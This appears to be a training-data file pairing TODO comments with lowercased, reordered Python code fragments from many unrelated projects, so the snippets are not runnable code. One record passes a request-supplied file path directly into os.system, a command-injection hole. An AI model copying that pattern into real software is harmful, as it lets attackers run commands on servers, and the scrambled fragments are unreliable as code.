# todo: i believe this code here can be improved </s> selected_clf = np.zeros(diff.shape[0], dtype=np.int)	select best_competence = competences[np.arange(competences.shape[0]), best_index] diff = best_competence.reshape(-1, 1) - competences for row in range(diff.shape[0]): diff_list = list(diff[row, :])
# todo: handle "other" </s> other=[],	to_taxonomy rank=get_child_text(elem, 'rank'), uri=get_child_as(elem, 'uri', cls.to_uri), **elem.attrib)
# todo: change this to be architecture independent </s> raise runtimeerror("could not retrieve processor type: %s" %ex)	get_proc_type except Exception as ex:
# todo: catch errors </s> state = ired.state.subreqs.get(self.req_type, none)	done def done(): if self.req_type: else: state = ired.state
# todo: i18n </s> if self.service.scriptrunner.error:	show_script_error def show_script_error(self): Show the last script error (if any) details = self.service.scriptRunner.error self.service.scriptRunner.error = ''
# todo: this sucks. do a real approximation with something like dvsa. </s> if any('aeg_stdin' in name for name in val.variables) and not \	apply for subaddr in range(addr, addr+size): val = self.crash.state.memory.load(subaddr, 1) any(c.op == '__eq__' for c in self.crash.state.solver.constraints if not val.variables - c.variables): if root is not None:
if self.scene.world != none and self.scene.world.node_tree != none and 'background' in self.scene.world.node_tree.nodes: # todo: parse node tree </s> background_node = self.scene.world.node_tree.nodes['background']	export_camera o['frustum_culling'] = objref.arm_frustum_culling o['render_path'] = 'armory_default/armory_default' col = background_node.inputs[0].default_value strength = background_node.inputs[1].default_value
# todo: figure out how to import pycache files </s> if root.endswith("__pycache__"):	import_files for path in base_module.__path__: for root, _, files in os.walk(path, followlinks = True): continue for f in files:
# todo: chose a better hook position :) </s> if ex != unicornafl.uc_afl_ret_called_twice:	start_afl os._exit(0)  # that's a looot faster than tidying up. except unicornafl.UcAflError as ex: raise
# todo this should be more modular </s> if 'accounts' in response:	_get_targets if 'bindings' in response: targets += response['bindings'] targets += response['accounts'] request = None
# todo; to change this to checkpoint_callbacks to include static ucr </s> checkpoint_callback=ucr_processor	get_ucr_es_form_pillow event_handler = KafkaCheckpointEventHandler( checkpoint=checkpoint, checkpoint_frequency=1000, change_feed=change_feed, ) return ConstructedPillow(
# todo check if this always works? </s> col = bpy.data.collections.get('collection')	add_object_only_with_direction_vectors mesh = bpy.data.meshes.new('mesh') obj = bpy.data.objects.new(name, mesh) col.objects.link(obj) bm = bmesh.new()
# todo: format the inputs' directory name </s> if basename.startswith('_'):	_list_input_dir fpath = path.join(fdir, fname) basename = path.basename(fpath) continue if gfile.IsDirectory(fpath):
# todo add assertions </s> p = poll.objects.get()	test_update self.poll.question = "yours" self.poll.save() self.assertEqual(p.question, "yours")
# todo: create a default location to save for the specific deployment </s> filepath = request.args.get('filepath')	model_deployment_script_run def model_deployment_script_run(model_id, deployment_version_id, model_version_id): os.system("python " + filepath) return "complete", 200
pass # todo </s> def handle_request(self, input):	handle_request
# todo: test this block </s> meta_data.path=path	update_callback meta_data, md_created = MetaData.objects.get_or_create(content_type=content_type, object_id=instance.pk) if not md_created: # handle url change meta_data.save() if meta_data.update_from_related_object():
# todo: use a contextmanager to ensure we always delete the callback from the list. </s> del self.ping_callbacks[remote]	wait_ping except asyncio.futures.TimeoutError: logger.debug('timed out waiting for ping from {}'.format(remote)) return got_ping
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
# todo: revise exception taxonomy </s> except exception as e:	_get_verified_subkeys subkey = parse_pubkey_payload( bytearray(subkey_packet[-packet_data["body_len"]:])) log.info(e) continue
# todo: we lose the response code, so we can't check this </s> self.failunless("new.txt" in self._foo_node.children)	test_PUT_NEWFILEURL d = self.PUT("/vdrive/global/foo/new.txt", self.NEWFILE_CONTENTS) def _check(res): new_uri = self._foo_node.children["new.txt"] new_contents = self.files[new_uri]
# todo(qijun) the default decimal is 7, but numpy.dot and eigen.mul </s> numpy.testing.assert_almost_equal(actual, expect, decimal=3)	test_all actual = numpy.array(scope.get_var(out_name).get_tensor()) expect = getattr(self, out_name)
# todo page_size = size of each result page </s> client = asset_v1.assetserviceclient()	search_all_resources order_by=None): from google.cloud import asset_v1 response = client.search_all_resources( scope,
# todo untested </s> 1/0	__setattr__ self._name, nid, _api.MBSTRING_UTF8, value, -1, -1, 0) if not add_result:
#todo: implement mp3 cd support </s> device = str(cd.getproperty("block.device"))	add_cd_device if not cd.GetProperty("volume.disc.has_audio"): return #not CD-Audio cddev = devices.CDDevice( dev=device) self.devicemanager.add_device(cddev)
# todo is this check necessary; this was an assertion which are disabled in <4000 which is good </s> if len(name) != 1:	_set def _set(view, name: str, values: list, linewise: bool = False) -> None: name = str(name) raise ValueError('Register names must be 1 char long: ' + name) if name == _BLACK_HOLE:
# todo log here </s> return none	get_user_id ) except httplib.HTTPException: if response.status_code != 200: return None
# todo: match channel against [a-za-z0-9:._-]+ </s> raise exceptions.mpdnotimplemented  # todo	subscribe already. The name may consist of alphanumeric ASCII characters plus underscore, dash, dot and colon.
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	revert_resize def revert_resize(self, instance):
# todo: detect how directories being present is being handled. </s> 'supermodule' module."	test_plugins_403 assert result == ["supermodule"], "Should have detected the \
# todo(tobyboyd): remove eager flag when tf 1.0 testing ends. </s> if flags_obj.enable_eager and not keras_common.is_v2_0():	run Returns: Dictionary of training and eval stats. tf.compat.v1.enable_eager_execution() dtype = flags_core.get_tf_dtype(flags_obj)
# todo(solitude): remove this. </s> adp.update(**form.cleaned_data)	payments_confirm pk = client.create_seller_for_pay(addon) client.patch_seller_paypal(pk=pk, data=form.cleaned_data) AppSubmissionChecklist.objects.get(addon=addon).update(payments=True) addon.mark_done()
# todo: consider filtering by location type </s> return match_location(domain, xlsx_district_name)	match_district def match_district(domain, xlsx_district_name):
# todo: error handling like numba callwrappers.py </s> native_val = unbox_array(types.array(dtype=dtype, ndim=1, layout='c'), arr_obj, c)	lower_unbox_df_column arr_obj = c.pyapi.object_getattr_string(args[0], "values") dtype = sig.args[2].dtype return native_val.value
return # todo raise error </s> state = self.backend.playback.state.get()	PlayPause if not self.get_CanPause(): logger.debug(u'%s.PlayPause not allowed', PLAYER_IFACE) if state == PlaybackController.PLAYING: self.backend.playback.pause().get()
# todo(leofang): test newer rocm versions </s> if (self.axes == (0, 1) and self.shape == (2, 3, 4)):	setUp def setUp(self): if cupy.cuda.runtime.is_hip: raise unittest.SkipTest("hipFFT's PlanNd for this case "
data = {}  # todo: do we need public key handling now? </s> for key in self.__dict__.keys():	copy :type values: dict :rtype: new instance of the model being copied public_key = key.lstrip('_') value = values.pop(public_key, self.__dict__[key])
# todo better logging </s> try:	send_file def send_file(self, f_type): scp = SCPClient(self.ssh.get_transport()) if f_type == 'config':
f="'f.${def3}.${def3}'"             #todo </s> else:	test_3250_nonrecursive_expand_variables D="'D.${DEF1}.${DEF2}'"             #TODO E="'E.${DEF1111}.def5.${DEF2222}'"  #TODO A="'A.def1'" B="'B.def2.def3'"
# todo: actually kill the start/stop/restart/status command for 5.11 </s> if command in ['start', 'stop', 'restart', 'status'] and not in_developer_mode:	main else: command = args[0] logging.error('Please use supervisor to manage the agent') return 1
# # fixme: # todo: remove me </s> try:	unpack_url faup.decode(url) url_unpack = faup.get() to_crawl['domain'] = url_unpack['domain'].decode() except:
# todo: once the translation process is able to correctly extract </s> locale_regex = re.compile(	_visit if (path, untagged_key) in untagged_key_paths: return False r'^{}$'.format(locale_from_key), re.IGNORECASE) if not locale_regex.match(locale_identifier):
# todo generator </s> handle_dirty_dataset(ds, mode=if_dirty)	__call__ for ds_path in content_by_ds: ds = Dataset(ds_path) content = [ap['path'] for ap in content_by_ds[ds_path] if ap.get('type', None) != 'dataset' or ap['path'] == ds.path]
# todo: doc </s> print('exiting the daemon mode...')	daemonClose def daemonClose(self): self.sess.close() print('Daemon closed.')
# todo (abhikpal, 2017-06-06) </s> self._shader_program_id = none	__init__ def __init__(self): self._test_triangle = Shape((0, 0.5, 0), (0.5, -0.5, 0), (-0.5, -0.5, 0))
raise notimplementederror  # todo </s> def generator(*args, **kwargs):	generator
# todo(qingqing) : redirect c++ ostream to python stream. </s> core.disable_profiler(key_map[sorted_key], profile_path)	stop_profiler 'ave': core.EventSortingKey.kAve, }
# todo: if either ref or ref0 are not scalar and the output is </s> if meta_out['distributed']:	_compute_root_scale_factors if src_indices is not None: if not (np.isscalar(ref) and np.isscalar(ref0)): raise RuntimeError("vector scalers with distrib vars " "not supported yet.")
# todo(b/132329316) remove when `xla.compile` allows tf.device(tpu). </s> forward = with_soft_placement(forward)	assertCheckpointDistributionStrategy forward = tf.function(forward) if self.primary_device == "TPU": for index, variable in enumerate(variables): variable.assign(goldens.range_like(variable, start=index))
# todo: allow user to return an ordereddict </s> outputs = pack(outputs)	__call__ else: outputs = self.func(brick, *inputs, **kwargs) for i, output in enumerate(outputs): if isinstance(output, tensor.Variable):
#todo - introduce an annotated alignment class? </s> alignment._annotations = gr	next % (len(ids), self.records_per_alignment)) alignment = Alignment(self.alphabet) alignment_length = len(seqs.values()[0]) for id in ids :
# todo: docs and comments </s> torch.save(labels, "/private/home/bkorbar/torch_projects/vmz/pt/labels.pth")	aggredate_video_accuracy def aggredate_video_accuracy(softmaxes, labels, topk=(1,), aggregate="mean"): torch.save(softmaxes, "/private/home/bkorbar/torch_projects/VMZ/pt/SM.pth") maxk = max(topk)
# todo: remove this method in v2.5 </s> elif self._values['enabled'] in booleans_false:	disabled elif self._values['disabled'] in BOOLEANS_FALSE: return False return True elif self._values['enabled'] in BOOLEANS_TRUE:
# todo: ensure encoding </s> browsers_statistics = re.findall(r'"right">(.+?)\s', html, re.unicode)	get_browsers browsers = re.findall(r'\.asp">(.+?)<', html, re.UNICODE)
#todo - parse it? </s> self.assertequal(0, stdoutdata.count("***** no hits found *****"))	Pairwise self.assertEqual(10, stdoutdata.count("Query= "))
# todo kill state dependency </s> mode = state(view).mode	on_text_command if command == 'drag_select': if mode in (VISUAL, VISUAL_LINE, VISUAL_BLOCK): if (args.get('extend') or (args.get('by') == 'words') or args.get('additive')):
# todo: should we only export keys with signing capabilities? </s> if algorithm not in supported_signature_algorithms:	parse_pubkey_payload algorithm = data[ptr] ptr += 1
# naive implementation (todo) </s> content = re.sub(r"^\s*#.*", "", content)	_normalize_script def _normalize_script(self, content): content = "\n" + content + "\n" content = "\n".join([s for s in content.split("\n") if s])
pass # todo </s> return self._listplaylists()	_lsinfo if uri == u'/':
# todo: write code to add selected indirect virtual deps to </s> direct_deps = set(atom_graph.child_nodes(parent.cpv))	_select_atoms_highest_available else: if parent.cpv in atom_graph: selected_atoms = [atom for atom in mycheck[1] \ if atom in direct_deps]
# todo: if !blocking... </s> self.__exclusive_acquire()	acquire self.__nwait_shr -= 1 else: finally: self.__lock.release()
# todo: compare to plain for loop through the labels </s> sel = n.array([], dtype=n.int16)	get_samples_by_attr or isinstance(values, basestring): values = [ values ] sa = dataset.sa for value in values:
# todo: determine why this even happens, as it shouldn't be possible </s> if not new_clip.get("reader"):	accept new_clip["title"] = filename new_clip["image"] = thumb_path continue  # Skip to next file file_properties_fps = float(file.data["fps"]["num"]) / float(file.data["fps"]["den"])
# todo: instead of hiding..., which may consume memory... why don't killing? </s> self.hide()	clusterGraphWidget callable_object = self._create_callable_object( distance_function ) except Exception, e: msg = 'Please review your customized code. An error was raised while compiling: "' msg += str(e) + '"'
raise exception('lol') #todo fixme </s> project_dir = project_dir[:-1] if project_dir.endswith('/') else project_dir # strip trailing slash	_get_project_name def _get_project_name(project_dir): if not project_dir: project_name = os.path.split(project_dir)[-1] return project_name
# todo(zshi) remove this check when classic drivers are removed </s> if getattr(task.driver, 'bios', none):	_do_node_clean node.driver_internal_info = info node.save() try: task.driver.bios.cache_bios_settings(task)
'value': t.text,  # only for easy identification during debugging. todo: delete </s> 'xmlnode': t	parse_pages 'center_x': t_left + t_width / 2, 'center_y': t_top + t_height / 2, } page['texts'].append(text)
# todo: work around this </s> return (completions, completion_flags) # if completions else none	do_query_completions print('time to get completions: {0} seconds'.format(end_time - begin_time)) print('completion flag: {0}'.format(completion_flags))
# todo add options to modify the columns </s> matrix.append([endpoint.machine.name, endpoint.state,	do_show if vlan.startswith('VLAN'): vlan.split('VLAN')[1] endpoint.endpoint_data['mac'], endpoint.endpoint_data['segment'],
# todo: test logging messages. </s> self.manager.startup()	test_startup def test_startup(self): self.assertEquals(self.states, [])
# todo: can we assume reverse=false? </s> signals.m2m_changed.send(	add .filter(**self._lookup_kwargs())) new_ids = list(new_ids - set(vals)) sender=self.through, action="pre_add", instance=self.instance, reverse=False,
1  # todo: fill in identifier </s> ) # at this point address0 deposit is exhausted	test_netting first_direct_transfer0 = channel0.create_directtransfer( transfer_amount0, first_direct_transfer0.sign(privatekey0, address0) first_direct_transfer0_data = str(first_direct_transfer0.packed().data)
# todo: prepare this above </s> statement = self.secondary.delete(sql.and_(*[c == setter.associationrow[c.key] for c in self.secondary.c]))	save if self.secondary is not None: self.secondaryjoin.accept_visitor(setter) statement.echo = self.mapper.echo statement.execute()
# todo: we need to insert a linebreak here, but there is no </s> text = "\n" + text	insert_with_tags_by_name def insert_with_tags_by_name(buffer, line, text, tag): if line >= buffer.get_line_count(): buffer.insert_with_tags_by_name(get_iter_at_line_or_eof(buffer, line), text, tag)
# todo: find a better random value </s> return datetime.datetime.now()	_auto_value def _auto_value(self, prop): if prop.type == datetime.datetime: elif prop.type == datetime.date: return datetime.date.today()
# todo: remove once typeshed supports literal types </s> assert isinstance(ov, _winapi.overlapped)	write try: ov, err = _winapi.WriteFile(self.connection, data, overlapped=True) assert isinstance(err, int) try:
# todo: fix circular imports </s> from website.addons.wiki.exceptions import (	rename_node_wiki :param new_name: A string, the new page's name, e.g. ``"My Renamed Page"``. :param auth: All the auth information including user, API key. PageCannotRenameError, PageConflictError,
# todo disconnect pub/sub </s> pass	HelloWorldMessage print() finally: async def hello_world_sub(self): print("Setting up world sub")
# todo: add at least reflection tests before adding notimplemented version </s> def addtagid(context, tlid, tag, value):	addtagid *musicpd.org, current playlist section:* ``addtagid {SONGID} {TAG} {VALUE}``
# todo(pkilambi): process the output as needed </s> return out	service_get try: out = utils.execute('kubectl', 'get', 'service', uuid) except Exception as e: LOG.error("Couldn't get service  %s due to error %s" % (uuid, e))
# todo: remove in 1.4 </s> warn_deprecation(	as_string def as_string(self, skip_body=False): "Please use req.as_bytes", '1.3',
# todo: adjust for dhcpv6 </s> self.server = server	set_server server = "<<inherit>>"
# todo: perhaps unify all data collection in one single context. </s> elif key == 'vi_state_expecting_register':	on_query_context elif operator == sublime.OP_NOT_EQUAL: return False if operator == sublime.OP_EQUAL: return vintage_state.expecting_register
# todo(hub-cap):fix this ugly hack! </s> global uuid	update_status global MYSQLD_ARGS global PREPARING status = models.InstanceServiceStatus.find_by(instance_id=UUID) if PREPARING:
# todo: this can be removed for cartopy > 0.14.3 </s> if hasattr(self.ax, 'projection') and (self.transform or 'transform' in kwargs):	plot_barb -------- plot_parameter, plot_symbol, plot_text trans = kwargs.pop('transform', None) or self.transform x, y, _ = self. ax.projection.transform_points(trans, self.x, self.y).T
)  # todo: figure out the number of frames independent of 3d detection </s> self.eye_frame_num[1] = len(	__init__ self.eye_frame_num[0] = len( self._pupil_data_store[0, "3d"] self._pupil_data_store[1, "3d"] )  # TODO: Figure out the number of frames independent of 3d detection
# todo: add the parts to the music << >> </s> for p in group.parts:	makeBlock music = ly.dom.Simr() score.insert(0, music) ly.dom.Comment("Part {0}".format(p.part.title()), music) for g in group.groups:
# todo: gpt </s> if self.gpt:	get_devices def get_devices(self): devices = {'boot' : "", 'efi' : "", 'home' : "", 'lvm' : "", 'luks' : [], 'root' : "", 'swap' : ""} devices['boot'] = self.auto_device + "1" devices['root'] = self.auto_device + "2"
#todo: does not keep case </s> ('to it', 'to them'),	test__plnounoun ('mother-in-law', 'mothers-in-law'), ('about me', 'about us'), ('from it', 'from them'), ('with it', 'with them'),
# todo: refactor common tests for all models, e.g. shape checking </s> scores = model.forward_owa(triples)	test_simple batch_size = 16 triples = torch.zeros(batch_size, 3, dtype=torch.long) assert scores.shape == (batch_size, 1) scores = model.forward_cwa(triples[:, :2])
# todo: a possibility to call different wine binaries </s> if not which("wine"):	wanna_use_wine Ask the user if wine should be used. Wine is not used if user has no wine installed. return False print("  Should we call wine to determine an AOE installation? [Y/n]")
# xxx todo: real error handling, as this is probably going to </s> log.error("failed to copy driver disk files: %s", e.strerror)	run except IOError as e:
# todo: warn if field has_choices but not in table.filtering </s> print('creating indexes...', end='', flush=true)	handle end = time.time() print('  done in {:.3f}s.'.format(end - start)) start = time.time() Model.create_indexes()
# @todo: crud strings </s> self.add_components(tablename,	DiseaseDataModel ), ) disease_symptom = "disease_id", )
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_depth_too_small def test_fail_depth_too_small(self):
# todo xxx: bug 593055 </s> u = userprofile.objects.get(id='4043307')	TestUserDeleteForm data = {'password': 'foo', 'confirm': True, } r = self.client.post('/en-US/firefox/users/delete', data, follow=True) eq_(u.email, '') @patch('users.models.UserProfile.is_developer')
# todo: why don't we return a arraywithunit? </s> return val.__class__([unit(i, unit_type=unit_type,	wrapped_f val = f(*args, **kwargs) if isinstance(val, collections.Sequence): unit=unit) for i in val]) elif isinstance(val, collections.Mapping):
# todo: remove </s> page_number = page_number or context["request"].get.get(page_var, 1)	yt_paginator_autopaginate @register.assignment_tag(takes_context=True) def yt_paginator_autopaginate(context, object_list, per_page=15, page_var='page', page_number=None): return yt_paginate(object_list, per_page=per_page, page_number=page_number)
# todo.before_release: hack for reproducing the exact results we have in </s> while true:	reset_model low=-0.1, high=0.1, size=self.model.nq) + self.init_qpos.squeeze() qpos[self.TARGET_INDS] = self.init_qpos.squeeze()[self.TARGET_INDS] puck_position = np.random.uniform( low=[0.3, -1.0], high=[1.0, -0.4]),
# todo: higher dimensions? happens often in statistics </s> if len(mat.dim) != 2:	_matrix try: from sage.matrix.constructor import matrix raise TypeError m = matrix(mat.ncol, mat.nrow, [i for i in mat])
pass  # todo: implement this </s> def show_context_menu(self, point):	show_context_menu
and not self.allow_all_insecure):  # todo: remove after release </s> logger.debug("skipping %s because it is an insecure and "	_link_package_versions and not link.verifiable and not normalize_name(search_name).lower() in self.allow_insecure "unverifiable file." % link) self.need_warn_insecure = True
# todo(tsileo): handle tombstone </s> data = db.outbox.find_one({'id': item_id, 'meta.deleted': false})	outbox_activity @app.route('/outbox/<item_id>/activity') def outbox_activity(item_id): if not data: abort(404)
# todo: pytest.warns is not supported until pytest >= 2.8.0, whose </s> with warnings.catch_warnings(record=true) as ws:	test_async_rpc_deprecation_warning container.start() with entrypoint_hook(container, 'deprecated_async') as call_async: assert call_async() == [[], {}] assert len(ws) == 1
# todo: min() and max() patches do nothing useful at present. just remove? </s> with notracing():	_max def _max(*values, key=lambda x: x, default=_MISSING): if len(values) <= 1: if not values:
# todo: specific exceptions, useful error reporting </s> import sys	generate_span_type_html root_nodes = __read_event_hierarchy(event_type_hierarchy.split("\n")) except: print >> sys.stderr, 'brat htmlgen.py: error parsing event hierarchy.' root_nodes = [EventHierarchyNode("GO:-------", "event")]
# todo: get rid of this after we remove reconfig. </s> if setup_mode == 'full':	_setup_procs self.recording_options._parent_name = self.msginfo self._setup_procs_finished = False self._vectors = {} if self._num_par_fd > 1:
# todo: write tests for handle_status </s> if key == 'nodata':	_handle_status def _handle_status(self, key, value): :raises: :exc:`ValueError` if the status message is unknown. self.nodata = True elif key == 'ENC_TO':
# todo: fix clone issue </s> assert self.x_train.shape[0] > cof_.n_neighbors_	test_check_parameters cof_.fit(self.X_train)
# todo: replace with "yield from" when dropping python 2. </s> for stream in self._parse_live_streams(channel):	_get_live_streams res = ajax(CHINFO_URL, cookies=cookies, data=params) channel = http.json(res, schema=_channel_schema) yield stream
# todo: check if a valid ipfs hash </s> print('no scheme in path, assuming ipfs hash and fetching...')	fetch_remote_index_file_contents path = path.replace('ipfs://', '') if '://' not in path:  # isAIPFSHash try: print("Trying to ipfs.cat('{0}')".format(path))
# xxx todo - do not duplicate code!!! </s> if dev_data is not none and save_dir is not none:	train_tensorflow reader.train(tf_optimizer, train_data, batch_size, max_epochs=epochs, hooks=hooks, l2=l2, clip=clip_value, clip_op=tf.clip_by_value, summary_writer=sw) reader.load(save_dir) result_dict = evaluate_reader(reader, dev_data, batch_size)
# todo: return proper searchable iterator </s> data = {	search_messages Returns: typing.Iterable: Found Message IDs "query": query, "snippetOffset": offset,
#todo, multipart raw submissions need further parsing capacity. </s> instance = self.request.raw_post_data	get_response attachments[key] = item else: try: doc = post_xform_to_couch(instance, attachments=attachments)
# todo: check if we can use orm to do that </s> sub_query = """	__get_list queryset = queryset.distinct() if with_comments_count: SELECT COUNT(*) FROM tutorialv2_contentreaction
# todo: flip this around when statemutability is output instead </s> if "payable" in abi and abi["payable"]:	test_json_interface_calls c2 = get_contract(code, interface_codes={"jsonabi": {"type": "json", "code": abi}}) assert c2.test_call(c1.address, value) == value del abi["payable"] abi["stateMutability"] = "payable"
pass  # todo(zcd) </s> def test_check_forward_backward_with_bias(self):	test_check_forward_backward_with_bias
# todo: switch to split tokenizing? much faster </s> tokens = nlp.tokenizer(text)	tokenize def tokenize(self, text, **kwargs): return [t.text for t in tokens]
# todo: deleting remote folders involves reimplementing </s> except exception as e:	delete_selected try: gfile.delete(None) show_error(str(e)) continue
# todo: other types than can have series inside: list, set, etc. </s> return typ	if_series_to_array_type if isinstance(typ, (types.Tuple, types.UniTuple)): return types.Tuple(list(map(if_series_to_array_type, typ.types)))
# todo: add more checks here? </s> if magic in ('fws', 'cws'):	can_parse return False magic = body[:3] return True return False
# todo: handle case where end of sysex is reached too </s> vendor = bytes[0]	parse yield opcode2msg[opcode] elif opcode == 0xf7: data = tuple([ord(b) for b in bytes]) msg = opcode2msg[opcode](vendor=vendor, data=data)
# todo add verbose output </s> self._host = new_host	host @host.setter def host(self, new_host: str):
try: # todo: fix this. if not in the scanning workbench, _drawmachine() fails. </s> self._platformmesh[machine_model_path]._mesh.vbo.release()	_drawMachine glEnable(GL_CULL_FACE) if machine_model_path in self._platformMesh: except: pass
# todo(rakhmerov): why is it here? this module is too generic. </s> ensure every input param has a default value(it will be a notdefined	get_input_dict def get_input_dict(inputs): object if it's not provided). input_dict = {}
# todo: if py3k, override unpickler.find_class(). </s> pass	_load mypickle.find_global = None except AttributeError: self._cache_data = mypickle.load() f.close()
# todo verify permission type for the provided resource type </s> resolver = resolvers.get_resolver_for_permission_type(permission_type=permission_type)	user_has_resource_api_permission if not cfg.CONF.rbac.enable: return True result = resolver.user_has_resource_api_permission(user_db=user_db, resource_api=resource_api, permission_type=permission_type)
# todo: use rule in raw table not default chain policy </s> try:	enable_panic_mode if self._panic: raise FirewallError(ALREADY_ENABLED) self._set_policy("DROP", "all") except Exception, msg:
# self.assertisnotnone(cursor.query_planning_time_in_millis)  # todo flaky test </s> self.assertisnotnone(cursor.output_location)	test_as_pandas self.assertIsNotNone(cursor.query_queue_time_in_millis) self.assertIsNotNone(cursor.total_execution_time_in_millis) self.assertIsNone(cursor.data_manifest_location)
# todo: remove in v2.8 </s> if hasattr(self.choiceset, 'legacy_map') and obj in self.choiceset.legacy_map:	ChoiceField ('label', self._choices[obj]) ]) data['id'] = self.choiceset.LEGACY_MAP.get(obj) return data
# todo tests </s> def prepare_version(version=none):	prepare_version if not version: version = __version_info__
# todo: support multiple selections </s> win, view, rowcol = view.window(), view, view.rowcol(view.sel()[0].b)	mark def mark(self, name, view): _MARKS[name] = win, view, rowcol
# todo: add primitive_type info in debug info later. </s> _logger.debug(	get_gradient grad_records = self._array_grad_records.get(current_array, []) for grad_record in grad_records: 'Calling derivative func "{}"'.format(grad_record.grad_func)) grad = grad_record.grad_func(self._get_cached_gradient(grad_record.result))
# todo(paul): why does 'event' not have a 'user' object? </s> user = self.hs.parse_userid(builder.user_id)	create_and_send_event self.validator.validate_new(builder) self.ratelimit(builder.user_id) assert self.hs.is_mine(user), "User must be our own: %s" % (user,) if builder.type == EventTypes.Member:
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	poll_rebooting_instances def poll_rebooting_instances(self, timeout):
raise notimplementederror()  # todo </s> not implemented yet!	list_settings_profiles .. WARNING::
# todo(mlavalle) this notification should be updated to publish when </s> registry.notify(address_group, events.after_update, self,	update_address_group ag.update_fields(fields) ag.update() context=context, address_group_id=ag.id) return self._make_address_group_dict(ag)
# todo: remove once elasticsearch v6.x is deprecated. </s> if self._getclientmajorversion() < 7:	_FlushEvents 'index': self._index_name, 'request_timeout': self._DEFAULT_REQUEST_TIMEOUT} bulk_arguments['doc_type'] = self._document_type self._client.bulk(**bulk_arguments)
# todo: in the future we should be able to choose different providers </s> blob = spnego_negtokeninit()	kerberos_login sessionSetup['Parameters']['SessionKey']           = 0 sessionSetup['Parameters']['Capabilities']         = SMB.CAP_EXTENDED_SECURITY | SMB.CAP_USE_NT_ERRORS | SMB.CAP_UNICODE | SMB.CAP_LARGE_READX | SMB.CAP_LARGE_WRITEX blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']] tgs = decoder.decode(tgs, asn1Spec = TGS_REP())[0]
# todo: rewrite tests </s> pass	test_resend_confirmation_get def test_resend_confirmation_get(self):
pass # todo </s> def _check_repair_results(rres):	_check_repair_results
# todo deprecate? </s> return self.raw.get('fulltext')	text def text(self) -> Optional[str]:
# todo: figure out if we really need to override these methods, or if there is a  bug in the default </s> return self.server.url('/audio/:/transcode/universal/start.m3u8?%s' % urlencode(params))	getStreamUrl params['protocol'] = kwargs['protocol']
# todo: with git <= 2.3 keep old mechanism: </s> with git_repo.git.custom_environment(**gitrepo.git_ssh_env):	_call_gitpy_with_progress if is_ssh(url): ssh_manager.get_connection(url).open() ret = callable(**git_kwargs) else:
# todo(mattjj,phawkins): improve this implementation </s> return batched_fun	vmap return tree_unflatten(out_tree(), out_flat)
# todo: warn on failure to delete? </s> pass	_delete_arc_event_arg mods.change(before, event_ann) else:
# todo maybe return suitable values for the last property </s> return completiondata.lilypond_markup	test self.column = self.lastpos if equalSign: if prop: return # TODO: maybe drop back at properties
# todo(sloria): test me </s> return os.path.join('dropbox', 'files', self.path)	file_url raise ValueError('Path field must be defined.')
# todo: test require restart </s> tasks.restart_named(self.master, self.replicas[0])	test_disable_reenable_signing_master ] self.master.run_command(args) assert wait_until_record_is_signed( self.master.ip, test_zone, timeout=100
# todo: remove in v1.2 </s> def test_oneclass_fit_params_is_deprecated():	test_oneclass_fit_params_is_deprecated clf = svm.OneClassSVM() params = {
# todo: allow for defining custom path param options in the </s> if '{locale}' in self.path_format:	path_params def path_params(self): params = {} params['locale'] = [str(locale) for locale in self.locales] return params
# todo do a proper mro resolution. currently we are just listing </s> for cls in self.py_bases():	py_mro mro.add(cls) mro = [self] add(cls) for cls_new in cls.mro():
# todo: check error location </s> assert result.errors[0].message == non_null_sync_error.message	test_nulls_the_top_level_if_sync_non_nullable_field_throws assert result.data is None assert len(result.errors) == 1
# #todo make sure we switch to correct units for machine when saving file </s> try:	dataChanged else: tmpl = lambda s: self.imperial_text_template % s qualified = float(data) except Exception as e:
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# @todo: extend entity_types within the template </s> deploy_mission = t("mission"),	DocumentLibrary cms_post = T("Post"), cr_shelter = T("Shelter"), dc_response = T(settings.get_dc_response_label()), event_event = T("Event"),
# todo: use a better measure then first tab </s> if hasattr(menu, '_tabs') and isinstance(menu._tabs[0], mainsquareoverviewtab):	_on_player_level_upgrade if hasattr(menu, "name") and menu.name == "build_menu_tab_widget": self.show_build_menu(update=True) instance = list(self.session.selected_instances)[0] instance.get_component(SelectableComponent).show_menu(jump_to_tabclass=type(menu.current_tab))
# todo(phawkins): enable test after jaxlib 0.1.22 is released. </s> check_dtypes=true)	testIssue776 self.assertAllClose(onp.zeros(3,), api.grad(f)(onp.ones(3,)),
# todo: replace with "yield from" when dropping python 2. </s> for stream in self._parse_live_streams(channel):	_get_live_streams res = ajax(CHINFO_URL, cookies=cookies, data=params) channel = http.json(res, schema=_channel_schema) yield stream
return cursor_offset, line #todo not implemented </s> def titlecase_next_word(cursor_offset, line):	titlecase_next_word @on('\x1bc')
# todo: this operation will cause damage to disk data which should be limited </s> if from_disk:	zfs_remove_disk raise MiddlewareError('Disk could not be removed: "%s"' % error) self.sync_encrypted(volume) self.__gpt_unlabeldisk(from_disk)
# todo: direct use of json['error'] is deprecated; use display_message('...', 'error') instead. </s> j_dic['error'] = 'unable to parse the following line(s):<br/>{}'.format(	enrich_json_with_data ) if ann_obj.failed_lines: '\n<br/>\n'.join( ['{}: {}'.format(
# todo(user): remove after 184 is out. </s> if self._request_filename is none or hasattr(self, "_183_test"):	FileOutputWriterBase output_sharding = self.__class__._get_output_sharding( mapper_spec=mapreduce_spec.mapper) writer_state = self._State.from_json(shard_state.writer_state) self._request_filename = writer_state.request_filenames[0]
# todo: warning </s> return	_append_credentials data = self.attacks.get(con) if not data: credentials = { "password": icd.password,
# todo(israt) :add reduce func to suport the following reduce op </s> _test(fn.copy_e, fn.sum)	test_unary_copy_e assert(F.allclose(e_grad1, e_grad2))
# todo: add back: </s> if isinstance(obj, (dataframe, series)):	notna >>> ks.notna(ser.index) True return obj.notna() else:
pass  # todo </s> def begin_ambient_camera_rotation(self, rate=0.02):	begin_ambient_camera_rotation
# todo. optionally sort on birthdate </s> childlist = [child_ref.ref for child_ref in childlist]	display_ind_relationships of.write('\t\t\t\t<td class="ColumnValue">\n') of.write('\t\t\t\t\t<ol>\n') sort = Sort.Sort(self.report.database) childlist.sort(sort.by_birthdate)
